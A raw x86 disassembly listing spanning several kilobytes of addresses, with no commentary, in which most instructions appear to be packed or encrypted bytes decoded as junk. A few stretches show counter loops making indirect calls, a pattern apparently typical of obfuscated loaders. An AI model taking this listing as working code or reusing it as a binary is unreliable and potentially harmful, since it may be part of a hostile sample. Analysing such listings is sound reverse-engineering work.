  4074db:	mov    BYTE PTR [ebx-0x6ce0bde5],cl
  4074e1:	sti    
  4074e2:	icebp  
  4074e3:	push   0x65
  4074e5:	test   dl,bh
  4074e7:	cmp    DWORD PTR [eax-0x4c],ebx
  4074ea:	pop    ebx
  4074eb:	sub    al,0xcb
  4074ed:	add    eax,0x57bcccea
  4074f2:	mov    ds:0x396a37db,eax
  4074f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074f8:	mov    DWORD PTR [esi+0x58],eax
  4074fb:	add    esi,DWORD PTR [edx+0x2680a54e]
  407501:	lea    eax,[ebx-0x2e1572e8]
  407507:	add    eax,0x5ab88af0
  40750c:	mov    dh,0xae
  40750e:	add    DWORD PTR ds:0x822ca874,0x2e
  407515:	dec    ecx
  407516:	ret    0xc721
  407519:	mov    DWORD PTR [edi+0x2e],edx
  40751c:	push   0xddf5caa1
  407521:	xor    cl,BYTE PTR [ecx]
  407523:	sub    esi,DWORD PTR [eax-0x729d4b84]
  407529:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40752a:	pop    edi
  40752b:	jcxz   0x4075a5
  40752e:	push   ebx
  40752f:	cmp    eax,0x13c00b1c
  407534:	mov    ds:0x809fc2d8,eax
  407539:	ss push esi
  40753b:	mov    edx,0xa572ecb0
  407540:	jns    0x407520
  407542:	(bad)  
  407544:	xor    BYTE PTR ds:0x772733db,0x7d
  40754b:	fadd   st(5),st
  40754d:	add    esi,esi
  40754f:	lods   al,BYTE PTR ds:[esi]
  407550:	fs (bad) 
  407552:	mov    bl,0x98
  407554:	adc    al,0xf6
  407556:	ret    
  407557:	adc    dh,BYTE PTR [edi+ebx*2+0x5690ab3a]
  40755e:	ficomp WORD PTR [eax+0x3d]
  407561:	inc    ebp
  407562:	inc    ebp
  407563:	push   ebp
  407564:	and    eax,0xc210087b
  407569:	test   eax,0x306d2bd8
  40756e:	mov    bl,0xa5
  407570:	sbb    BYTE PTR [edx+0x45846f00],0x82
  407577:	ret    0xe61b
  40757a:	adc    al,0x17
  40757c:	or     ebx,DWORD PTR gs:[edi+ebp*8+0x4766af4e]
  407584:	hlt    
  407585:	paddq  mm4,mm5
  407588:	sbb    eax,0x224b563b
  40758d:	add    DWORD PTR ds:0x7ca7ad83,edx
  407593:	add    bl,BYTE PTR [edx+0x3a]
  407596:	inc    ecx
  407597:	dec    esp
  407598:	mov    DWORD PTR [ecx-0x22c5755b],edx
  40759e:	call   0x8dcd41c2
  4075a3:	mov    cl,0x74
  4075a5:	aad    0x14
  4075a7:	mul    BYTE PTR [eax]
  4075a9:	xlat   BYTE PTR ds:[ebx]
  4075aa:	jbe    0x407542
  4075ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075ad:	inc    esi
  4075ae:	jbe    0x407565
  4075b0:	sub    eax,DWORD PTR [eax+0x47cfbe28]
  4075b6:	or     DWORD PTR [eax+0x4c],esp
  4075b9:	inc    esi
  4075ba:	adc    eax,0x8e943e6d
  4075bf:	inc    esp
  4075c0:	lock sbb eax,0xf58e0314
  4075c6:	pop    es
  4075c7:	pop    esi
  4075c8:	out    dx,eax
  4075c9:	mov    esi,0x7d12872a
  4075ce:	jno    0x407591
  4075d0:	inc    esp
  4075d1:	icebp  
  4075d2:	inc    edx
  4075d3:	xchg   edx,eax
  4075d4:	xor    eax,0xb844ffbe
  4075d9:	or     al,ah
  4075db:	les    ecx,FWORD PTR [ebx-0x40c24dcd]
  4075e1:	inc    BYTE PTR [edi+0x17d767f2]
  4075e7:	fdivr  DWORD PTR [edi]
  4075e9:	or     BYTE PTR [ebx+0x4f],ch
  4075ec:	push   ds
  4075ed:	ss pushaw 
  4075f0:	sbb    DWORD PTR [eax-0x1e],eax
  4075f3:	xchg   ebp,eax
  4075f4:	pop    edx
  4075f5:	jb     0x40762b
  4075f7:	xor    BYTE PTR [ebx],bh
  4075f9:	jns    0x40763e
  4075fb:	add    bh,BYTE PTR [edi+0x14c0bc39]
  407601:	imul   ebp,DWORD PTR [esi-0x48],0x48
  407605:	(bad)  
  407606:	mov    dh,0x9b
  407608:	(bad)  [eax+0x1f]
  40760b:	pushf  
  40760c:	bound  edi,QWORD PTR [ecx-0x139bedb0]
  407612:	cli    
  407613:	fcomi  st,st(3)
  407615:	sbb    dh,BYTE PTR [eax-0x75]
  407618:	das    
  407619:	add    al,0x4f
  40761b:	aaa    
  40761c:	mov    eax,0x1aeb840f
  407621:	add    BYTE PTR [eax],al
  407623:	push   ebx
  407624:	jmp    0x408d87
  407629:	and    DWORD PTR ds:0x42edcb,0x0
  407633:	jmp    0x407647
  407638:	xor    edx,edx
  40763a:	xor    edx,DWORD PTR ds:0x42edcb
  407640:	inc    edx
  407641:	mov    DWORD PTR ds:0x42edcb,edx
  407647:	cmp    DWORD PTR ds:0x42edcb,0x1b
  40764e:	jae    0x40768b
  407654:	cmp    DWORD PTR ds:0x42edcb,0xa
  40765b:	jne    0x40766a
  407661:	push   DWORD PTR [ebp-0x10]
  407664:	call   DWORD PTR ds:0x42eab3
  40766a:	cmp    DWORD PTR ds:0x42edcb,0x9
  407671:	jne    0x407686
  407677:	xor    edx,edx
  407679:	xor    edx,DWORD PTR ds:0x42edcb
  40767f:	inc    edx
  407680:	mov    DWORD PTR ds:0x42edcb,edx
  407686:	jmp    0x407638
  40768b:	mov    edx,DWORD PTR [ebp-0x8]
  40768e:	mov    edi,DWORD PTR [ebp-0x10]
  407691:	sub    edi,edx
  407693:	jmp    0x407844
  407698:	or     DWORD PTR [ecx+0x67a86788],ebp
  40769e:	icebp  
  40769f:	jno    0x407690
  4076a1:	out    dx,al
  4076a2:	jns    0x4076bb
  4076a4:	aam    0x2a
  4076a6:	leave  
  4076a7:	sbb    DWORD PTR [ecx-0x3e],eax
  4076aa:	jle    0x40772a
  4076ac:	mov    bh,BYTE PTR [edi+0x7e]
  4076af:	jle    0x4076c6
  4076b1:	lahf   
  4076b2:	pop    esi
  4076b3:	loopne 0x40772c
  4076b5:	adc    al,0x61
  4076b7:	out    dx,al
  4076b8:	into   
  4076b9:	mov    ebx,0x9f957224
  4076be:	jnp    0x40773d
  4076c0:	pop    ebp
  4076c1:	pushf  
  4076c2:	pop    ds
  4076c3:	aaa    
  4076c4:	sbb    ah,cl
  4076c6:	xor    edx,DWORD PTR [ebp-0x3a]
  4076c9:	(bad)  
  4076cb:	lods   al,BYTE PTR ds:[esi]
  4076cc:	fiadd  DWORD PTR [esi]
  4076ce:	or     bh,ch
  4076d0:	idiv   BYTE PTR [edi+0x6e705749]
  4076d6:	dec    ecx
  4076d7:	xchg   esi,eax
  4076d8:	mov    ebp,0x75fd4a00
  4076dd:	xchg   esp,eax
  4076de:	jp     0x40768b
  4076e0:	adc    dh,ah
  4076e2:	push   0x521d3bfe
  4076e7:	out    dx,eax
  4076e8:	dec    edx
  4076e9:	sub    bh,BYTE PTR [esi]
  4076eb:	cdq    
  4076ec:	into   
  4076ed:	mov    al,0x7c
  4076ef:	sub    esp,esp
  4076f1:	mov    ebx,0x79bda80a
  4076f6:	fdivr  QWORD PTR [ebp+0x7e]
  4076f9:	add    eax,0xb82942f
  4076fe:	sbb    dl,BYTE PTR [esi+ebx*4]
  407701:	add    al,0x2c
  407703:	pop    edx
  407704:	mov    dh,0xb1
  407706:	cmp    edx,esp
  407708:	xor    ebx,DWORD PTR [eax-0x4e]
  40770b:	gs int3 
  40770d:	or     eax,0x6a08ec46
  407712:	leave  
  407713:	cmp    ch,ch
  407715:	adc    DWORD PTR [esi+0xb],0xd248d0f5
  40771c:	adc    ah,bh
  40771e:	jg     0x4076d5
  407720:	fisubr DWORD PTR [esi-0x2c4dc4f6]
  407726:	inc    esp
  407727:	jmp    0x4076ef
  407729:	dec    ebx
  40772a:	dec    esi
  40772b:	inc    edx
  40772c:	sub    al,0xd3
  40772e:	ss cmp eax,edx
  407731:	icebp  
  407732:	mov    ecx,0x5dc5da3a
  407737:	outs   dx,DWORD PTR ds:[esi]
  407738:	add    dl,BYTE PTR [esp+edi*4-0x3]
  40773c:	test   BYTE PTR [ebx+0x58],dl
  40773f:	mov    bh,0xa0
  407741:	gs xchg ebx,eax
  407743:	ja     0x4076ea
  407745:	pop    si
  407747:	xor    eax,0x2b480998
  40774c:	or     ecx,DWORD PTR [ebp-0x645a1d03]
  407752:	xchg   edi,eax
  407753:	dec    esi
  407754:	jl     0x4077bf
  407756:	in     eax,dx
  407757:	jg     0x4077b8
  407759:	push   ebx
  40775a:	popf   
  40775b:	out    0x83,al
  40775d:	push   eax
  40775e:	jge    0x407783
  407760:	scas   eax,DWORD PTR es:[edi]
  407761:	scas   eax,DWORD PTR es:[edi]
  407762:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407763:	cmp    al,0xd2
  407765:	int3   
  407766:	pop    ecx
  407767:	or     DWORD PTR [eax],0x4c
  40776a:	nop
  40776b:	ss retf 
  40776d:	push   es
  40776e:	mov    al,ds:0xb32cbeb6
  407773:	sub    BYTE PTR [ebx+0x7a],ch
  407776:	popf   
  407777:	jno    0x40778b
  407779:	ins    BYTE PTR es:[edi],dx
  40777a:	jmp    0xb2ef:0x38e74035
  407781:	arpl   WORD PTR [esi],dx
  407783:	and    al,0xbd
  407785:	ret    
  407786:	repnz mov ss,WORD PTR [edx+0x2a5712fb]
  40778d:	sub    eax,0xa45701b4
  407792:	pop    ecx
  407793:	outs   dx,DWORD PTR ds:[esi]
  407794:	ins    BYTE PTR es:[edi],dx
  407795:	xor    DWORD PTR [ecx-0x43],edx
  407798:	mov    ecx,0x7294aa12
  40779d:	in     eax,dx
  40779e:	pusha  
  40779f:	inc    esp
  4077a0:	mov    bh,BYTE PTR [edx-0x1ad29a12]
  4077a6:	jae    0x4077e8
  4077a8:	(bad)  
  4077a9:	hlt    
  4077aa:	in     al,0x17
  4077ac:	sbb    esp,DWORD PTR [ebx]
  4077ae:	adc    dh,bh
  4077b0:	rcr    dh,1
  4077b2:	jge    0x40776d
  4077b4:	mov    BYTE PTR [edx-0x74],bl
  4077b7:	lods   al,BYTE PTR ds:[esi]
  4077b8:	loop   0x4077a4
  4077ba:	in     al,dx
  4077bb:	repz inc esi
  4077bd:	pop    esp
  4077be:	mov    DWORD PTR [ebp-0x47722181],ebp
  4077c4:	test   eax,0x5ec5819a
  4077c9:	out    0x8c,eax
  4077cb:	mov    eax,0xe5054e00
  4077d0:	jg     0x4077bf
  4077d2:	mov    ds:0xa9c35fbf,al
  4077d7:	call   0xd83aba55
  4077dc:	sahf   
  4077dd:	xor    al,0x49
  4077df:	jmp    0x407836
  4077e1:	push   ebx
  4077e2:	pushf  
  4077e3:	push   es
  4077e4:	inc    edi
  4077e5:	aam    0xa1
  4077e7:	test   eax,0xb9cc7b33
  4077ec:	sbb    DWORD PTR [ebp-0xf],edi
  4077ef:	add    DWORD PTR [edx+0x56],edx
  4077f2:	or     BYTE PTR [esi],cl
  4077f4:	(bad)  
  4077f6:	dec    esp
  4077f7:	je     0x407835
  4077f9:	cmp    esi,edi
  4077fb:	mov    ch,0x66
  4077fd:	cmp    bh,bh
  4077ff:	dec    ecx
  407800:	xlat   BYTE PTR ds:[ebx]
  407801:	fwait
  407802:	fwait
  407803:	lock dec edx
  407805:	aam    0xac
  407807:	or     DWORD PTR [ebp+0x2],esi
  40780a:	stos   DWORD PTR es:[edi],eax
  40780b:	pop    esi
  40780c:	jns    0x4077ec
  40780e:	fwait
  40780f:	(bad)  
  407810:	outs   dx,DWORD PTR ds:[esi]
  407811:	(bad)  
  407813:	mov    ds:0xe92bb7c8,eax
  407818:	and    al,0x6a
  40781a:	call   0x2a715764
  40781f:	js     0x407892
  407821:	add    eax,0xeb72d92e
  407826:	out    0xb3,al
  407828:	mov    cl,0xb2
  40782a:	mov    ds:0x7d0d448d,eax
  40782f:	xchg   DWORD PTR [edx],ebx
  407831:	nop
  407832:	in     eax,0x60
  407834:	sahf   
  407835:	sub    BYTE PTR [ebp+esi*1+0x5f],ch
  407839:	add    DWORD PTR [ebx-0x10107a8e],edx
  40783f:	pop    esp
  407840:	mov    BYTE PTR [edx-0x51],0xba
  407844:	mov    edx,DWORD PTR [ebp-0x4]
  407847:	adc    DWORD PTR ds:0x430449,0x4304cf
  407851:	xor    edx,eax
  407853:	add    edx,ecx
  407855:	cmp    edi,edx
  407857:	mov    DWORD PTR ds:0x43046d,0x688e
  407861:	jb     0x40910d
  407867:	mov    DWORD PTR ds:0x42e7c4,0x1e
  407871:	cmp    DWORD PTR ds:0x42e7c4,0x0
  407878:	je     0x4078a9
  40787e:	cmp    DWORD PTR ds:0x42e7c4,0x25
  407885:	jne    0x407896
  40788b:	push   0x2141
  407890:	call   DWORD PTR ds:0x42eab7
  407896:	mov    edi,DWORD PTR ds:0x42e7c4
  40789c:	dec    edi
  40789d:	mov    DWORD PTR ds:0x42e7c4,edi
  4078a3:	jmp    0x407871
  4078a8:	inc    edx
  4078a9:	mov    edx,DWORD PTR [ebp-0x28]
  4078ac:	mov    edi,DWORD PTR [ebp-0x4]
  4078af:	xor    edx,eax
  4078b1:	xor    edi,eax
  4078b3:	sub    ebx,DWORD PTR ds:0x42edcf
  4078b9:	add    edi,ecx
  4078bb:	add    edx,ecx
  4078bd:	and    DWORD PTR ds:0x43043d,0x0
  4078c7:	xor    ebx,ebx
  4078c9:	or     ebx,DWORD PTR ds:0x43043d
  4078cf:	inc    ebx
  4078d0:	mov    DWORD PTR ds:0x43043d,ebx
  4078d6:	cmp    DWORD PTR ds:0x43043d,0x15
  4078dd:	jne    0x4078f1
  4078e3:	push   0x1
  4078e5:	push   DWORD PTR [ebp-0x20]
  4078e8:	push   DWORD PTR [ebp-0x10]
  4078eb:	call   DWORD PTR ds:0x42ec27
  4078f1:	cmp    DWORD PTR ds:0x43043d,0x11
  4078f8:	jb     0x4078c7
  4078fe:	imul   edx,edi
  407901:	mov    edi,DWORD PTR [ebp-0x8]
  407904:	mov    ebx,DWORD PTR [ebp-0x10]
  407907:	sub    ebx,edi
  407909:	cmp    ebx,edx
  40790b:	ja     0x40791d
  407911:	mov    edx,DWORD PTR [ebp-0x4]
  407914:	xor    edx,eax
  407916:	add    edx,ecx
  407918:	jmp    0x40877e
  40791d:	mov    edx,DWORD PTR [ebp-0x2c]
  407920:	mov    edi,DWORD PTR [ebp-0x4]
  407923:	xor    edx,eax
  407925:	xor    edi,eax
  407927:	add    edi,ecx
  407929:	add    edx,ecx
  40792b:	imul   edx,edi
  40792e:	mov    edi,DWORD PTR [ebp-0x8]
  407931:	jmp    0x407ae2
  407936:	ret    0x1100
  407939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40793a:	shl    DWORD PTR [ebp+0x7ad26172],1
  407940:	dec    edi
  407941:	call   edi
  407943:	shl    DWORD PTR [ebx-0x3e],cl
  407946:	ffree  st(0)
  407948:	jle    0x4079c8
  40794a:	mov    bh,BYTE PTR [edi+0x7e]
  40794d:	jle    0x4079cc
  40794f:	nop    esi
  407952:	repnz iret 
  407954:	les    ebx,FWORD PTR [edx]
  407956:	cmp    al,0x55
  407958:	scas   al,BYTE PTR es:[edi]
  407959:	mov    al,0xf5
  40795b:	adc    DWORD PTR [ebp+0x41],ebx
  40795e:	jmp    0xfe98:0xa3f2ef44
  407965:	inc    DWORD PTR [esi]
  407967:	jge    0x40799f
  407969:	test   BYTE PTR [edx],dl
  40796b:	ficomp WORD PTR [esi+0x6b]
  40796e:	mov    BYTE PTR [eax+0x2d],dh
  407971:	imul   ebx,ecx,0xffffffc2
  407974:	rol    BYTE PTR [edx-0x71],0x3e
  407978:	imul   edi,DWORD PTR [ecx-0x1c],0x392a59bf
  40797f:	jmp    0x4079cb
  407981:	xchg   ecx,eax
  407982:	(bad)  
  407983:	scas   al,BYTE PTR es:[edi]
  407984:	(bad)  
  407985:	sub    eax,0x51adb000
  40798a:	cmp    BYTE PTR [edx+ecx*2-0x2628bdbb],ch
  407991:	(bad)  
  407992:	outs   dx,DWORD PTR ds:[esi]
  407993:	pusha  
  407994:	dec    esi
  407995:	or     DWORD PTR [ecx+ebx*8],0x72faed6f
  40799c:	ins    BYTE PTR es:[edi],dx
  40799d:	add    bl,BYTE PTR [ebp+0x2114a18]
  4079a3:	pop    eax
  4079a4:	mov    BYTE PTR [edx],0x1
  4079a7:	mov    al,ds:0x816d004a
  4079ac:	ins    DWORD PTR es:[edi],dx
  4079ad:	cmp    DWORD PTR [edx+0x5692cbdd],ecx
  4079b3:	sub    al,0x2e
  4079b5:	mov    esi,cs
  4079b7:	mov    ebp,ebp
  4079b9:	std    
  4079ba:	daa    
  4079bb:	aam    0xc6
  4079bd:	ds push esi
  4079bf:	jno    0x4079d3
  4079c1:	or     eax,0x85e56d4e
  4079c6:	mov    ds:0xb4834a31,eax
  4079cb:	dec    eax
  4079cc:	aam    0x56
  4079ce:	int    0x17
  4079d0:	mov    ecx,0xaa593fa1
  4079d5:	adc    DWORD PTR [edi-0x4c7844f9],edi
  4079db:	and    al,0xef
  4079dd:	jb     0x4079ee
  4079df:	sbb    BYTE PTR [esi+ecx*2],cl
  4079e2:	push   dx
  4079e4:	adc    al,0xfb
  4079e6:	shl    DWORD PTR [edx-0x2],0xc6
  4079ea:	cld    
  4079eb:	or     al,0x69
  4079ed:	fidiv  WORD PTR [esi+0x66b8165d]
  4079f3:	dec    ecx
  4079f4:	loop   0x4079d6
  4079f6:	xor    ah,ah
  4079f8:	jg     0x407a17
  4079fa:	jno    0x407a7b
  4079fc:	in     eax,0x5e
  4079fe:	ror    DWORD PTR [eax+eax*1],0x88
  407a02:	int3   
  407a03:	mov    dh,0x7c
  407a05:	out    dx,eax
  407a06:	dec    ebp
  407a07:	lods   eax,DWORD PTR ds:[esi]
  407a08:	stos   BYTE PTR es:[edi],al
  407a09:	mov    edi,0xf07c1ec7
  407a0e:	(bad)  
  407a0f:	std    
  407a10:	pop    edi
  407a11:	dec    edx
  407a12:	cwde   
  407a13:	loopne 0x4079fa
  407a15:	(bad)  
  407a16:	scas   eax,DWORD PTR es:[edi]
  407a17:	adc    bl,BYTE PTR [ecx-0x5c555fb]
  407a1d:	xor    BYTE PTR [ecx],0xd
  407a20:	jnp    0x4079a8
  407a22:	inc    esp
  407a23:	lahf   
  407a24:	aad    0x8d
  407a26:	jns    0x4079b4
  407a28:	lahf   
  407a29:	fmul   DWORD PTR [ecx+ebx*8]
  407a2c:	lods   eax,DWORD PTR ds:[esi]
  407a2d:	jmp    0x8862:0xdd8d619f
  407a34:	fld    TBYTE PTR [ebx+0x134aba63]
  407a3a:	nop
  407a3b:	or     edi,DWORD PTR ds:[edx-0x5d26507d]
  407a42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a43:	out    dx,al
  407a44:	addr16 xchg edi,eax
  407a46:	push   esp
  407a47:	call   0x4dee26d6
  407a4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a4d:	pop    edx
  407a4e:	retf   0xec42
  407a51:	inc    eax
  407a52:	mov    BYTE PTR [ebp-0x20],ah
  407a55:	push   esi
  407a56:	xchg   ecx,eax
  407a57:	scas   al,BYTE PTR es:[edi]
  407a58:	les    eax,FWORD PTR [ebx+0x64b1dc6e]
  407a5e:	test   eax,0x9f3b85ed
  407a63:	out    0x5d,eax
  407a65:	lods   al,BYTE PTR ds:[esi]
  407a66:	or     BYTE PTR [eax+0xa],0xcd
  407a6a:	cmp    BYTE PTR [eax],cl
  407a6c:	lock (bad) 
  407a6e:	int    0x7f
  407a70:	and    DWORD PTR [eax+edx*1-0x45],edi
  407a74:	std    
  407a75:	jp     0x407ab1
  407a77:	pop    ecx
  407a78:	mov    eax,0xe03c6f1
  407a7d:	iret   
  407a7e:	out    dx,al
  407a7f:	mov    bl,0x50
  407a81:	js     0x407a71
  407a83:	inc    eax
  407a84:	mov    edi,0xc228633c
  407a89:	sti    
  407a8a:	mov    ecx,0x10c129a1
  407a8f:	mov    ecx,0xf5cb4964
  407a94:	dec    edi
  407a95:	ds xchg edx,esi
  407a98:	outs   dx,DWORD PTR ds:[esi]
  407a99:	mov    ebx,0x7cb30c90
  407a9e:	loope  0x407a7f
  407aa0:	mov    ah,0x81
  407aa2:	xchg   ecx,eax
  407aa3:	and    BYTE PTR [edx+0x3e7a65fb],bh
  407aa9:	jp     0x407a48
  407aab:	idiv   BYTE PTR [ebp-0x39]
  407aae:	pop    ebx
  407aaf:	lds    esi,FWORD PTR [esi+esi*1-0x80]
  407ab3:	or     ebp,DWORD PTR [eax-0x3a]
  407ab6:	fsubr  QWORD PTR [ebp-0x74]
  407ab9:	aas    
  407aba:	(bad)  
  407abc:	sub    dh,BYTE PTR [ecx-0x658d599e]
  407ac2:	sbb    ch,dh
  407ac4:	push   es
  407ac5:	pop    eax
  407ac6:	and    DWORD PTR [ebp+ecx*2-0x1b15f751],esp
  407acd:	pop    esi
  407ace:	jmp    0x407a75
  407ad0:	imul   ecx,DWORD PTR [esi],0x75399d0c
  407ad6:	loop   0x407b4a
  407ad8:	inc    esi
  407ad9:	pushf  
  407ada:	pop    es
  407adb:	cmp    bh,ah
  407add:	and    ah,BYTE PTR [ebx]
  407adf:	outs   dx,BYTE PTR ds:[esi]
  407ae0:	test   DWORD PTR [esi],0x2bf05d8b
  407ae6:	fistp  QWORD PTR [ebx]
  407ae8:	fimul  DWORD PTR [edi]
  407aea:	xchg   DWORD PTR [eax],ecx
  407aec:	add    BYTE PTR [eax],al
  407aee:	add    BYTE PTR [ebx+0x79e9d855],cl
  407af4:	or     al,0x0
  407af6:	add    BYTE PTR [ebx+0x7d8bd055],cl
  407afc:	cld    
  407afd:	jmp    0x407cae
  407b02:	mov    WORD PTR [edx+0x6130bf0c],?
  407b08:	dec    ebp
  407b09:	jno    0x407ae6
  407b0b:	les    ecx,FWORD PTR [esi-0x477e9b36]
  407b11:	call   0x7f8a:0x7e7ec169
  407b18:	jle    0x407b98
  407b1a:	js     0x407b2e
  407b1c:	mov    eax,0xd5fd7eb6
  407b21:	dec    esi
  407b22:	retf   
  407b23:	push   0xffffffff
  407b25:	(bad)  
  407b26:	jb     0x407af3
  407b28:	out    dx,al
  407b29:	(bad)  
  407b2a:	(bad)  
  407b2b:	mov    ds:0xc5910d3a,al
  407b30:	cld    
  407b31:	(bad)  
  407b32:	retf   0xb781
  407b35:	ja     0x407ae4
  407b37:	add    DWORD PTR [eax-0x51],esi
  407b3a:	loope  0x407b30
  407b3c:	scas   al,BYTE PTR es:[edi]
  407b3d:	cwde   
  407b3e:	lea    esi,[ecx]
  407b40:	push   0x43aee27c
  407b45:	add    bh,BYTE PTR [eax+ecx*8-0x56]
  407b49:	mov    eax,ds
  407b4b:	mov    cl,0x43
  407b4d:	jmp    0xd7900c72
  407b52:	pop    edx
  407b53:	loope  0x407b15
  407b55:	jmp    0x407bcf
  407b57:	scas   eax,DWORD PTR es:[edi]
  407b58:	pop    ecx
  407b59:	push   esp
  407b5a:	(bad)  
  407b5b:	inc    esi
  407b5c:	out    0xff,al
  407b5e:	aas    
  407b5f:	sub    BYTE PTR [ebx-0x5ea51e8e],bl
  407b65:	outs   dx,DWORD PTR ds:[esi]
  407b66:	mov    eax,ds:0x88f2475d
  407b6b:	(bad)  
  407b6c:	xor    ebp,ebp
  407b6e:	scas   al,BYTE PTR es:[edi]
  407b6f:	push   ss
  407b70:	push   esi
  407b71:	sti    
  407b72:	scas   al,BYTE PTR es:[edi]
  407b73:	push   ebx
  407b74:	mov    WORD PTR [esi+0x50b4458],?
  407b7a:	stos   BYTE PTR es:[edi],al
  407b7b:	or     ecx,0xed798247
  407b81:	mov    ecx,ecx
  407b83:	cld    
  407b84:	inc    ecx
  407b85:	hlt    
  407b86:	dec    esp
  407b87:	imul   ebp,DWORD PTR [ebp+0x9f2b9d5],0x7d8a73ff
  407b91:	rcr    DWORD PTR [ebx+0x37a6c998],cl
  407b97:	push   esi
  407b98:	repnz loopne 0x407b76
  407b9b:	push   esp
  407b9c:	repz cpuid 
  407b9f:	xchg   esp,esp
  407ba1:	jnp    0x407b95
  407ba3:	stos   BYTE PTR es:[edi],al
  407ba4:	jmp    0x407c18
  407ba6:	and    BYTE PTR [edi-0x436cc5b9],0xc0
  407bad:	sbb    esp,DWORD PTR [esi]
  407baf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bb0:	aaa    
  407bb1:	pop    ebx
  407bb2:	rcr    WORD PTR [edi+0x53be3f4c],cl
  407bb9:	fsubr  DWORD PTR [edi-0x27ee99e4]
  407bbf:	push   ds
  407bc0:	jae    0x407bb7
  407bc2:	dec    edx
  407bc3:	mov    edi,0x305742f5
  407bc8:	add    edi,DWORD PTR [edi+0x6b]
  407bcb:	dec    esp
  407bcc:	scas   al,BYTE PTR es:[edi]
  407bcd:	loope  0x407bc0
  407bcf:	jne    0x407bff
  407bd1:	mov    dl,0xc9
  407bd3:	inc    edx
  407bd4:	xor    al,dl
  407bd6:	out    0x96,eax
  407bd8:	pushf  
  407bd9:	pop    esi
  407bda:	stc    
  407bdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bdc:	rol    DWORD PTR [ebx-0x75],0xfe
  407be0:	ds loop 0x407ba1
  407be3:	into   
  407be4:	retf   0x2840
  407be7:	mov    edx,0x8d399eff
  407bec:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  407bee:	out    dx,eax
  407bef:	pushf  
  407bf0:	data16 jp 0x407c0d
  407bf3:	push   ss
  407bf4:	sbb    edx,ecx
  407bf6:	es (bad) 
  407bf8:	stos   BYTE PTR es:[edi],al
  407bf9:	push   es
  407bfa:	std    
  407bfb:	stc    
  407bfc:	or     esp,DWORD PTR [ebx+0xa2a0532]
  407c02:	add    eax,0x741d7657
  407c07:	jle    0x407b90
  407c09:	push   0xa35f0d6e
  407c0e:	in     al,0x45
  407c10:	jge    0x407be1
  407c12:	push   es
  407c13:	push   0x2a9caa60
  407c18:	mov    DWORD PTR [ecx+0x6e1f3926],esi
  407c1e:	stos   BYTE PTR es:[edi],al
  407c1f:	inc    eax
  407c20:	mov    dl,0x8
  407c22:	sub    esi,DWORD PTR [edx-0x56]
  407c25:	pop    ds
  407c26:	push   edi
  407c27:	or     al,0xe3
  407c29:	pushf  
  407c2a:	cdq    
  407c2b:	or     bh,BYTE PTR [esp+ebp*1-0x46b07ca5]
  407c32:	inc    ecx
  407c33:	sub    ch,BYTE PTR [eax+0x6b]
  407c36:	(bad)  
  407c37:	adc    eax,0x247ce89c
  407c3c:	int3   
  407c3d:	sbb    BYTE PTR [ebx+0x2f],ah
  407c40:	push   ecx
  407c41:	push   esp
  407c42:	jns    0x407c2e
  407c44:	test   al,0x1e
  407c46:	xor    al,BYTE PTR [edi]
  407c48:	stos   BYTE PTR es:[edi],al
  407c49:	mov    ecx,0xfaafbb8c
  407c4e:	or     eax,0xb2b3a1b3
  407c53:	ins    DWORD PTR es:[edi],dx
  407c54:	adc    DWORD PTR [ecx-0x47],esi
  407c57:	lods   al,BYTE PTR ds:[esi]
  407c58:	ret    
  407c59:	enter  0x93a3,0x93
  407c5d:	add    eax,0x7913a67e
  407c62:	jp     0x407cbf
  407c64:	add    ebx,edi
  407c66:	mov    ch,0x8e
  407c68:	lods   al,BYTE PTR ds:[esi]
  407c6a:	push   ebx
  407c6b:	popa   
  407c6c:	push   ebp
  407c6d:	and    ecx,DWORD PTR ds:0x1dbc5b17
  407c73:	mov    esi,DWORD PTR [eax+0x48]
  407c76:	test   eax,0xa36ce255
  407c7b:	jmp    0xc8e0:0x8bca5a4d
  407c82:	sub    BYTE PTR [esi-0x406b5e0d],ch
  407c88:	out    0xf0,al
  407c8a:	sub    eax,DWORD PTR [esi-0x7fe3b067]
  407c90:	outs   dx,DWORD PTR ds:[esi]
  407c91:	dec    ebp
  407c92:	fnstcw WORD PTR [edx]
  407c94:	add    eax,0xa5be4258
  407c99:	jne    0x407ca7
  407c9b:	(bad)  
  407c9c:	pop    ebx
  407c9d:	jl     0x407c2f
  407c9f:	or     BYTE PTR [edx],0x25
  407ca2:	xor    DWORD PTR [eax-0x474e671d],ecx
  407ca8:	cmp    al,0x37
  407caa:	in     eax,0xa1
  407cac:	add    BYTE PTR [ebx+esi*1-0x30],ch
  407cb0:	xor    edi,eax
  407cb2:	add    edi,ecx
  407cb4:	add    edx,ecx
  407cb6:	imul   edx,edi
  407cb9:	mov    edi,DWORD PTR [ebp-0x8]
  407cbc:	mov    ebx,DWORD PTR [ebp-0x10]
  407cbf:	sub    ebx,edi
  407cc1:	cmp    ebx,edx
  407cc3:	jmp    0x407e74
  407cc8:	imul   esp,DWORD PTR [eax],0xfffffff2
  407ccb:	mov    cl,0x71
  407ccd:	jno    0x407d38
  407ccf:	loopne 0x407d06
  407cd1:	(bad)  
  407cd2:	cmp    bh,BYTE PTR [eax+0x59bb3b95]
  407cd8:	test   edi,ecx
  407cda:	jle    0x407d5a
  407cdc:	mov    bh,BYTE PTR [edi+0x7e]
  407cdf:	jle    0x407ca5
  407ce1:	and    BYTE PTR [ebx-0x2dee6cf9],ch
  407ce7:	sar    BYTE PTR [edi+0x6aa25601],cl
  407ced:	or     BYTE PTR [ebx+0x339b9e23],0xc4
  407cf4:	adc    eax,0xef208fe1
  407cf9:	and    eax,0x6ecc3d4b
  407cfe:	pop    ecx
  407cff:	hlt    
  407d00:	pop    eax
  407d01:	dec    edi
  407d02:	or     bl,BYTE PTR ds:0x885c3a77
  407d08:	jbe    0x407cf6
  407d0a:	lds    eax,FWORD PTR [ecx+0x2cd5a993]
  407d10:	mov    ebp,0xd5cf391a
  407d15:	in     eax,0x5
  407d17:	mov    esp,0x27c4f081
  407d1c:	mov    al,0x7
  407d1e:	call   0x85da:0x76df9d84
